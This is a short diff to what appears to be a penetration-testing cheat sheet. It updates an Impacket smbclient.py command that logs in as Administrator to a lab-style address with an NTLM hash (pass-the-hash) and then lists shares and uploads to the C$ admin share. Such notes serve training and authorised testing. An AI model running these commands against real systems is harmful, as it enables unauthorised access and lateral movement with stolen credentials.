@@ -436,7 +436,7 @@ PHP:
 
 ### Impacket
 - connect smbclient.py with hash:   
-  `/usr/share/doc/python-impacket/examples/smbclient.py -hashes aad3b435b51404eeaad3b435b51404ee:175a592f3b0c0c5f02fad40c51412d3a Administrator@10.11.1.202` 
+  `/usr/share/doc/python3-impacket/examples/smbclient.py -hashes :175a592f3b0c0c5f02fad40c51412d3a Administrator@10.11.1.202` 
 - get shares: `shares` 
 - upload something to c$:  
   `use C$`  
